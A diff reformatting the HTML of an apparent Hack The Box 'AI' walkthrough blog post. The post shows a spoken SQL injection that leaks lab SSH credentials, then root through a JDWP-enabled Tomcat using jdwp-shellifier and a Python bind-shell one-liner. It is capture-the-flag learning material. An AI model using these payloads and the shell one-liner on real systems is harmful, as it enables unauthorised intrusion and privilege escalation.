@@ -1,13 +1,107 @@
-<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content="ceso "><meta name=description content="Quick Summary Finally, I&amp;rsquo;m posting the walk-through of this box, currently, I&amp;rsquo;m preparing my OSCP so most of my free time goes dedicated to it :D. At the time I did this box, I was only documenting with screenshots, so some dates could differ between the write up below as I accessed now to get plain text to not overload this with screenshots.
-This was a box where for the foothold, you needed to upload a ."><meta name=keywords content="CTF,Security,HTB,Blog,Infosec,htb-medium,linux,sqli,jwdp"><meta name=robots content="noodp"><meta name=theme-color content="#252627"><link rel=canonical href=https://ceso.github.io/posts/2020/02/hack-the-box-ai/><title>Hack The Box - AI :: Ceso Adventures</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=https://ceso.github.io/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css><link rel=stylesheet type=text/css href=https://ceso.github.io/css/scroll.css><link rel=apple-touch-icon sizes=180x180 href=https://ceso.github.io/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://ceso.github.io/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://ceso.github.io/favicon-16x16.png><link rel=manifest href=https://ceso.github.io/site.webmanifest><link rel=mask-icon href=https://ceso.github.io/safari-pinned-tab.svg color=#252627><link rel="shortcut icon" href=https://ceso.github.io/favicon.ico><meta name=msapplication-TileColor content="#252627"><meta name=theme-color content="#252627"><meta itemprop=name content="Hack The Box - AI"><meta itemprop=description content="My write-up / walkthrough for AI from Hack The Box."><meta itemprop=datePublished content="2020-02-07T00:00:00+00:00"><meta itemprop=dateModified content="2020-02-07T00:00:00+00:00"><meta itemprop=wordCount content="1277"><meta itemprop=image content="https://ceso.github.io/images/htb/ai/ai-header.jpg"><meta itemprop=keywords content="htb-medium,linux,sqli,jwdp,"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://ceso.github.io/images/htb/ai/ai-header.jpg"><meta name=twitter:title content="Hack The Box - AI"><meta name=twitter:description content="My write-up / walkthrough for AI from Hack The Box."><meta property="article:published_time" content="2020-02-07 00:00:00 +0000 UTC"></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=https://ceso.github.io/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
-<span class=logo__text>ceso@hogsmeade$</span>
-<span class=logo__cursor style=background-color:gray></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://ceso.github.io/about/>About</a></li><li><a href=https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/>Cheatsheet</a></li><li><a href=https://ceso.github.io/posts/>Posts</a></li><li><a href=https://ceso.github.io/posts/2020/12/hacking-resources/>Resources</a></li><li><a href=https://ceso.github.io/tags/>Tags</a></li><li><a href=https://ceso.github.io/posts/2021/03/my-videos/>Videos</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><div class=post><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>6 minutes
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="ie=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=author content="ceso ">
+<meta name=description content="Quick Summary Finally, I&amp;rsquo;m posting the walk-through of this box, currently, I&amp;rsquo;m preparing my OSCP so most of my free time goes dedicated to it :D. At the time I did this box, I was only documenting with screenshots, so some dates could differ between the write up below as I accessed now to get plain text to not overload this with screenshots.
+This was a box where for the foothold, you needed to upload a .">
+<meta name=keywords content="CTF,Security,HTB,Blog,Infosec,htb-medium,linux,sqli,jwdp">
+<meta name=robots content="noodp">
+<meta name=theme-color content="#252627">
+<link rel=canonical href=https://ceso.github.io/posts/2020/02/hack-the-box-ai/>
+<title>
+Hack The Box - AI :: Ceso Adventures
+</title>
+<link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css rel=stylesheet type=text/css>
+<link rel=stylesheet href=https://ceso.github.io/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css>
+<link rel=stylesheet type=text/css href=https://ceso.github.io/css/scroll.css>
+<link rel=apple-touch-icon sizes=180x180 href=https://ceso.github.io/apple-touch-icon.png>
+<link rel=icon type=image/png sizes=32x32 href=https://ceso.github.io/favicon-32x32.png>
+<link rel=icon type=image/png sizes=16x16 href=https://ceso.github.io/favicon-16x16.png>
+<link rel=manifest href=https://ceso.github.io/site.webmanifest>
+<link rel=mask-icon href=https://ceso.github.io/safari-pinned-tab.svg color=#252627>
+<link rel="shortcut icon" href=https://ceso.github.io/favicon.ico>
+<meta name=msapplication-TileColor content="#252627">
+<meta name=theme-color content="#252627">
+<meta itemprop=name content="Hack The Box - AI">
+<meta itemprop=description content="My write-up / walkthrough for AI from Hack The Box."><meta itemprop=datePublished content="2020-02-07T00:00:00+00:00">
+<meta itemprop=dateModified content="2020-02-07T00:00:00+00:00">
+<meta itemprop=wordCount content="1277"><meta itemprop=image content="https://ceso.github.io/images/htb/ai/ai-header.jpg">
+<meta itemprop=keywords content="htb-medium,linux,sqli,jwdp,">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://ceso.github.io/images/htb/ai/ai-header.jpg">
+<meta name=twitter:title content="Hack The Box - AI">
+<meta name=twitter:description content="My write-up / walkthrough for AI from Hack The Box.">
+<meta property="article:published_time" content="2020-02-07 00:00:00 +0000 UTC">
+</head>
+<body class=dark-theme>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=https://ceso.github.io/ style=text-decoration:none>
+<div class=logo>
+<span class=logo__mark>></span>
+<span class=logo__text>ceso@hogsmeade$ </span>
+<span class=logo__cursor style=background-color:gray>
+</span>
+</div>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class=menu__inner><li><a href=https://ceso.github.io/about/>About</a></li><li><a href=https://ceso.github.io/posts/2020/04/hacking/hacking-cheatsheet/>Cheatsheet</a></li><li><a href=https://ceso.github.io/posts/>Posts</a></li><li><a href=https://ceso.github.io/posts/2020/12/hacking-resources/>Resources</a></li><li><a href=https://ceso.github.io/tags/>Tags</a></li><li><a href=https://ceso.github.io/posts/2021/03/my-videos/>Videos</a></li>
+</ul>
+</nav>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+<span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
+</span>
+</span>
+</span>
+</header>
+<div class=content>
+<div class=post>
+<div class=post-info>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>6 minutes
 | Tambien disponible en
-<a href=https://ceso.github.io/es/posts/2020/02/hack-the-box-ai/><span class="flag flag-icon flag-icon-es flag-icon-squared"></span></a></p></div><h2 class=post-title><a href=https://ceso.github.io/posts/2020/02/hack-the-box-ai/>Hack The Box - AI</a></h2><div class=post-meta><span class=post-date>2020-02-07</span></div><span class=post-tags>#<a href=https://ceso.github.io/tags/htb-medium/>htb-medium</a>&nbsp;
+<a href=https://ceso.github.io/es/posts/2020/02/hack-the-box-ai/><span class="flag flag-icon flag-icon-es flag-icon-squared"></span></a>
+</p>
+</div>
+<h2 class=post-title><a href=https://ceso.github.io/posts/2020/02/hack-the-box-ai/>Hack The Box - AI</a></h2>
+<div class=post-meta>
+<span class=post-date>
+2020-02-07
+</span>
+</div>
+<span class=post-tags>
+#<a href=https://ceso.github.io/tags/htb-medium/>htb-medium</a>&nbsp;
 #<a href=https://ceso.github.io/tags/linux/>linux</a>&nbsp;
 #<a href=https://ceso.github.io/tags/sqli/>sqli</a>&nbsp;
-#<a href=https://ceso.github.io/tags/jwdp/>jwdp</a>&nbsp;</span><div class=post-content><div id=TableOfContents><ul><li><a href=#quick-summary>Quick Summary</a></li><li><a href=#nmap>Nmap</a></li><li><a href=#web-enumeration>Web enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#privilege-escalation>Privilege escalation</a></li></ul></div><img src=https://ceso.github.io/images/htb/ai/info-card.png class=center style=border-radius:8px><h2 id=quick-summary>Quick Summary</h2><p>Finally, I&rsquo;m posting the walk-through of this box, currently, I&rsquo;m preparing my OSCP so most of my free time goes dedicated to it :D.
-At the time I did this box, I was only documenting with screenshots, so some dates could differ between the write up below as I accessed now to get plain text to not overload this with screenshots.</p><p>This was a box where for the foothold, you needed to upload a .wav file with a sql injection to get the reverse shell (the .wav is interpreted by an AI), and for the root you needed to exploit <a href=https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html>JWDP</a>, the idea of using an AI for the foothold, was original kudos for that, but the implementation of it, and the multiple tries-error with different <a href=https://en.wikipedia.org/wiki/Speech_synthesis>TTS</a> I didn&rsquo;t like it, in summary, was a box I didn&rsquo;t feel like learning something new at all.</p><p>Said that, time to get our hands dirty.</p><h2 id=nmap>Nmap</h2><p>As always the enumeration starts by running Nmap:</p><pre><code class=language-console data-lang=console># Nmap 7.80 scan initiated Wed Dec 11 15:33:30 2019 as: nmap -sC -sV -O -o nmap-ai.htb 10.10.10.163
+#<a href=https://ceso.github.io/tags/jwdp/>jwdp</a>&nbsp;
+</span>
+<div class=post-content><div id=TableOfContents>
+<ul>
+<li>
+<a href=#quick-summary>Quick Summary</a>
+</li><li>
+<a href=#nmap>Nmap</a>
+</li><li>
+<a href=#web-enumeration>Web enumeration</a>
+</li><li>
+<a href=#foothold>Foothold</a>
+</li><li>
+<a href=#privilege-escalation>Privilege escalation</a>
+</li></ul>
+</div>
+<img src=https://ceso.github.io/images/htb/ai/info-card.png class=center style=border-radius:8px>
+<h2 id=quick-summary>Quick Summary</h2>
+<p>Finally, I&rsquo;m posting the walk-through of this box, currently, I&rsquo;m preparing my OSCP so most of my free time goes dedicated to it :D.
+At the time I did this box, I was only documenting with screenshots, so some dates could differ between the write up below as I accessed now to get plain text to not overload this with screenshots.</p>
+<p>This was a box where for the foothold, you needed to upload a .wav file with a sql injection to get the reverse shell (the .wav is interpreted by an AI), and for the root you needed to exploit <a href=https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html>JWDP</a>, the idea of using an AI for the foothold, was original kudos for that, but the implementation of it, and the multiple tries-error with different <a href=https://en.wikipedia.org/wiki/Speech_synthesis>TTS</a> I didn&rsquo;t like it, in summary, was a box I didn&rsquo;t feel like learning something new at all.</p>
+<p>Said that, time to get our hands dirty.</p>
+<h2 id=nmap>Nmap</h2>
+<p>As always the enumeration starts by running Nmap:</p>
+<pre><code class=language-console data-lang=console># Nmap 7.80 scan initiated Wed Dec 11 15:33:30 2019 as: nmap -sC -sV -O -o nmap-ai.htb 10.10.10.163
 Nmap scan report for ai.htb (10.10.10.163)
 Host is up (0.019s latency).
 Not shown: 998 closed ports
@@ -38,12 +132,20 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Wed Dec 11 15:33:50 2019 -- 1 IP address (1 host up) scanned in 20.74 seconds
-</code></pre><p>Which discovers SSH and HTTP (Apache 2.4.29 as the server) open.</p><h2 id=web-enumeration>Web enumeration</h2><p>The home page just shows &ldquo;Artificial Intelligence&rdquo; and has some interactive menus, in one of them, is announced about an AI the company is developing, which can identify what&rsquo;s being told in it, so is possible to upload a file to server, this is already a way to go as is possible to upload a reverse shell.
-Some enumeration of it is carried.</p><img src=https://ceso.github.io/images/htb/ai/1.1-web.png class=center style=border-radius:8px>
+</code></pre><p>Which discovers SSH and HTTP (Apache 2.4.29 as the server) open.</p>
+<h2 id=web-enumeration>Web enumeration</h2>
+<p>The home page just shows &ldquo;Artificial Intelligence&rdquo; and has some interactive menus, in one of them, is announced about an AI the company is developing, which can identify what&rsquo;s being told in it, so is possible to upload a file to server, this is already a way to go as is possible to upload a reverse shell.
+Some enumeration of it is carried.</p>
+<img src=https://ceso.github.io/images/htb/ai/1.1-web.png class=center style=border-radius:8px>
 <img src=https://ceso.github.io/images/htb/ai/1.1-web-php-1.png class=center style=border-radius:8px>
 <img src=https://ceso.github.io/images/htb/ai/1.1-web-php-2.png class=center style=border-radius:8px>
-<img src=https://ceso.github.io/images/htb/ai/1.1-web-php-3.png class=center style=border-radius:8px><p>Is given a try to create a .wav file from text (text -> .mp3 -> .wav), upload it and see what happens, the result is an exception which gives a hint: there is access to a mysql database, which means will be possible to do an sql injection.</p><img src=https://ceso.github.io/images/htb/ai/1.1-web-rce-1.png class=center style=border-radius:8px>
-<img src=https://ceso.github.io/images/htb/ai/1.1-web-rce-2.png class=center style=border-radius:8px><h2 id=foothold>Foothold</h2><p>A step to make an sql injection was carried in the same way than before for the RCE, which resulted in nothing, based on that gobuster was run against AI to see if there was some web page that could give hints in HOW to properly write the sql injection for it being interpreted by the AI.</p><pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/ai# gobuster dir -u http://10.10.10.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php -o gobuster 
+<img src=https://ceso.github.io/images/htb/ai/1.1-web-php-3.png class=center style=border-radius:8px>
+<p>Is given a try to create a .wav file from text (text -> .mp3 -> .wav), upload it and see what happens, the result is an exception which gives a hint: there is access to a mysql database, which means will be possible to do an sql injection.</p>
+<img src=https://ceso.github.io/images/htb/ai/1.1-web-rce-1.png class=center style=border-radius:8px>
+<img src=https://ceso.github.io/images/htb/ai/1.1-web-rce-2.png class=center style=border-radius:8px>
+<h2 id=foothold>Foothold</h2>
+<p>A step to make an sql injection was carried in the same way than before for the RCE, which resulted in nothing, based on that gobuster was run against AI to see if there was some web page that could give hints in HOW to properly write the sql injection for it being interpreted by the AI.</p>
+<pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/ai# gobuster dir -u http://10.10.10.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php -o gobuster 
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
@@ -69,14 +171,23 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 ===============================================================
 2020/02/07 15:48:32 Finished
 ===============================================================
-</code></pre><p>As is possible to see above, <code>intelligence.php</code> was discovered, once that page is accessed, is found a guide on how to write some queries to the AI:</p><img src=https://ceso.github.io/images/htb/ai/2.1-rce-2.png class=center style=border-radius:8px><p>After a LOT of try-error (literally, I was never able to go beyond this if it wasn&rsquo;t for the help of <a href=https://www.hackthebox.eu/profile/10423>Interep</a> of both queries and different TTS (being I&rsquo;m not a native english speaker and neither I have a microphone), was used in the end <a href=https://www.text2speech.org/>Text 2 Speech</a>:</p><img src=https://ceso.github.io/images/htb/ai/t2s.png class=center style=border-radius:8px><p>getting as final SQL Injection the next:</p><pre><code>User:
+</code></pre><p>As is possible to see above, <code>intelligence.php</code> was discovered, once that page is accessed, is found a guide on how to write some queries to the AI:</p>
+<img src=https://ceso.github.io/images/htb/ai/2.1-rce-2.png class=center style=border-radius:8px>
+<p>After a LOT of try-error (literally, I was never able to go beyond this if it wasn&rsquo;t for the help of <a href=https://www.hackthebox.eu/profile/10423>Interep</a> of both queries and different TTS (being I&rsquo;m not a native english speaker and neither I have a microphone), was used in the end <a href=https://www.text2speech.org/>Text 2 Speech</a>:</p>
+<img src=https://ceso.github.io/images/htb/ai/t2s.png class=center style=border-radius:8px>
+<p>getting as final SQL Injection the next:</p>
+<pre><code>User:
 Open single quote union select, username from users Comment Database
 Password:
 Open single quote union select, password from users Comment Database
-</code></pre><p>Once it&rsquo;s respective .wav files generate by the TTS mentioned above were uploaded, the following were the results:</p><img src=https://ceso.github.io/images/htb/ai/command-ok-1.png class=center style=border-radius:8px>
-<img src=https://ceso.github.io/images/htb/ai/command-ok-2.png class=center style=border-radius:8px><p>Then, was tried to login via ssh with the credentials:</p><pre><code>user: alexa
+</code></pre><p>Once it&rsquo;s respective .wav files generate by the TTS mentioned above were uploaded, the following were the results:</p>
+<img src=https://ceso.github.io/images/htb/ai/command-ok-1.png class=center style=border-radius:8px>
+<img src=https://ceso.github.io/images/htb/ai/command-ok-2.png class=center style=border-radius:8px>
+<p>Then, was tried to login via ssh with the credentials:</p>
+<pre><code>user: alexa
 passwd: H,Sq9t6}a&lt;)?q93_
-</code></pre><p>Getting a success:</p><pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/ai# ssh alexa@10.10.10.163
+</code></pre><p>Getting a success:</p>
+<pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/ai# ssh alexa@10.10.10.163
 alexa@10.10.10.163's password: 
 Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.3.7-050307-generic x86_64)
 
@@ -105,7 +216,9 @@ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your 
 Last login: Fri Feb  7 20:14:41 2020 from 10.10.14.29
 alexa@AI:~$ wc -c user.txt
 33 user.txt
-</code></pre><h2 id=privilege-escalation>Privilege escalation</h2><p>When is checked which net. services are listening, was found :8080:</p><pre><code class=language-console data-lang=console>alexa@AI:~$ ss -punta
+</code></pre><h2 id=privilege-escalation>Privilege escalation</h2>
+<p>When is checked which net. services are listening, was found :8080:</p>
+<pre><code class=language-console data-lang=console>alexa@AI:~$ ss -punta
 Netid               State                    Recv-Q                Send-Q                                       Local Address:Port                                        Peer Address
 :Port                 
 udp                 UNCONN                   0                     0                                            127.0.0.53%lo:53                                               0.0.0.0
@@ -130,9 +243,15 @@ tcp                 LISTEN                   0                     100          
 tcp                 LISTEN                   0                     128                                                      *:80                                                     *:*                    
 tcp                 LISTEN                   0                     128                                                   [::]:22                                                  [::]:*                    
 tcp                 TIME-WAIT                0                     0                                       [::ffff:127.0.0.1]:8080                                  [::ffff:127.0.0.1]:3883
-</code></pre><p>then an ssh tunnel with <code>ssh -L 8080:localhost:8080 alexa@10.10.10.163</code> was run to know which service it was, resulting in tomcat:</p><img src=https://ceso.github.io/images/htb/ai/tomcat-tunnel.png class=center style=border-radius:8px><p>Checked the process runing, is possible to see that tomcat is being executed with root user and <a href=https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html>JDWP</a> enabled:</p><pre><code class=language-console data-lang=console>root       3875  5.5  5.8 3141684 118248 ?      Sl   21:02   0:05 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
-</code></pre><p>A quick search google gives a result the next <a href=https://www.exploit-db.com/exploits/46501>exploit</a></p><p>Then to use that exploit a <code>bind.sh</code> is created under <code>/tmp</code> with the next code:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>python <span style=color:#f92672>-</span>c <span style=color:#e6db74>&#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((&#39;&#39;,2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;])&#34;</span>
-</code></pre></div><p>So, it will bind a shell in the port 2222, after it the exploit is run using that script:</p><pre><code class=language-console data-lang=console>alexa@AI:~$ ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd /tmp/bind.sh 
+</code></pre><p>then an ssh tunnel with <code>ssh -L 8080:localhost:8080 alexa@10.10.10.163</code> was run to know which service it was, resulting in tomcat:</p>
+<img src=https://ceso.github.io/images/htb/ai/tomcat-tunnel.png class=center style=border-radius:8px>
+<p>Checked the process runing, is possible to see that tomcat is being executed with root user and <a href=https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html>JDWP</a> enabled:</p>
+<pre><code class=language-console data-lang=console>root       3875  5.5  5.8 3141684 118248 ?      Sl   21:02   0:05 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
+</code></pre><p>A quick search google gives a result the next <a href=https://www.exploit-db.com/exploits/46501>exploit</a></p>
+<p>Then to use that exploit a <code>bind.sh</code> is created under <code>/tmp</code> with the next code:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>python <span style=color:#f92672>-</span>c <span style=color:#e6db74>&#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((&#39;&#39;,2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;])&#34;</span>
+</code></pre></div><p>So, it will bind a shell in the port 2222, after it the exploit is run using that script:</p>
+<pre><code class=language-console data-lang=console>alexa@AI:~$ ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd /tmp/bind.sh 
 [+] Targeting '127.0.0.1:8000'
 [+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.4'
 [+] Found Runtime class: id=650
@@ -146,16 +265,60 @@ tcp                 TIME-WAIT                0                     0            
 [+] found Runtime.exec(): id=7f9080006b98
 [+] Runtime.exec() successful, retId=6f0
 [!] Command successfully executed
-</code></pre><p>Done that, is tried to get a connection to the server with nc to the server in port specified in <code>bind.sh</code> getting root access with it:</p><pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/ai# nc -v 10.10.10.163 2222
+</code></pre><p>Done that, is tried to get a connection to the server with nc to the server in port specified in <code>bind.sh</code> getting root access with it:</p>
+<pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/ai# nc -v 10.10.10.163 2222
 ai.lnx.htb [10.10.10.163] 2222 (?) open
 bash: cannot set terminal process group (6086): Inappropriate ioctl for device
 bash: no job control in this shell
 root@AI:~# wc -c /root/root.txt
 wc -c /root/root.txt
 33 /root/root.txt
-</code></pre><p>Done, we have root access and the root.txt flag :D.</p><p>This was so far one of the boxes I didn&rsquo;t like at all, thanks to the esoteric-ish foothold it had, I didn&rsquo;t end with a feeling of learning something at all after doing this box, anyway, that&rsquo;s all, later I&rsquo;m planning to start blogging current adventure into preparing OSCP, stay tuned for it.</p></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/><span class=button__icon>←</span>
-<span class=button__text>Hacking/OSCP cheatsheet</span></a></span>
-<span class="button next"><a href=https://ceso.github.io/posts/2020/01/hack-the-box-bitlab/><span class=button__text>Hack The Box - Bitlab</span>
-<span class=button__icon>→</span></a></span></div></div><script src=https://utteranc.es/client.js repo=ceso/blog-source issue-term=title label="comments :speech_balloon:" theme=github-dark crossorigin=anonymous async></script><script src=https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><a href=javascript: id=return-to-top><i class=icon-chevron-up></i></a><link href=//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css rel=stylesheet></div></div><footer class=footer><div class=footer__inner><div class=footer__content><span>&copy; 2020</span>
-<span></span><span><a href=https://ceso.github.io/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span></div></div><div class=footer__inner><div class=footer__content><span>Powered by <a href=http://gohugo.io>Hugo</a></span>
-<span>Theme made by <a href=https://github.com/rhazdon>rhazdon</a></span></div></div></footer></div><script type=text/javascript src=https://ceso.github.io/bundle.min.59ecdc8ddd50b30e6dd7ad4a5372c3fd24a26db671cc1575443b150ceb9d4bc8e73618fb298596b5c336cf5d8c2db90bd7e72a648479e97884e5398722f962fa.js integrity="sha512-Wezcjd1Qsw5t161KU3LD/SSibbZxzBV1RDsVDOudS8jnNhj7KYWWtcM2z12MLbkL1+cqZIR56XiE5TmHIvli+g=="></script><script src=https://ceso.github.io/js/scroll.js></script></body></html>
+</code></pre><p>Done, we have root access and the root.txt flag :D.</p>
+<p>This was so far one of the boxes I didn&rsquo;t like at all, thanks to the esoteric-ish foothold it had, I didn&rsquo;t end with a feeling of learning something at all after doing this box, anyway, that&rsquo;s all, later I&rsquo;m planning to start blogging current adventure into preparing OSCP, stay tuned for it.</p>
+</div>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h>Read other posts</span>
+<hr>
+</div>
+<div class=pagination__buttons>
+<span class="button previous">
+<a href=https://ceso.github.io/posts/2020/04/hacking-cheatsheet/>
+<span class=button__icon>←</span>
+<span class=button__text>Hacking Cheatsheet</span>
+</a>
+</span>
+<span class="button next">
+<a href=https://ceso.github.io/posts/2020/01/hack-the-box-bitlab/>
+<span class=button__text>Hack The Box - Bitlab</span>
+<span class=button__icon>→</span>
+</a>
+</span>
+</div>
+</div>
+<script src=https://utteranc.es/client.js repo=ceso/blog-source issue-term=title label="comments :speech_balloon:" theme=github-dark crossorigin=anonymous async></script>
+<script src=https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js></script>
+<a href=javascript: id=return-to-top><i class=icon-chevron-up></i></a>
+<link href=//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css rel=stylesheet>
+</div>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class=footer__content>
+<span>&copy; 2020</span>
+<span></span>
+<span> <a href=https://ceso.github.io/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span>
+</div>
+</div>
+<div class=footer__inner>
+<div class=footer__content>
+<span>Powered by <a href=http://gohugo.io>Hugo</a></span>
+<span>Theme made by <a href=https://github.com/rhazdon>rhazdon</a></span>
+</div>
+</div>
+</footer>
+</div>
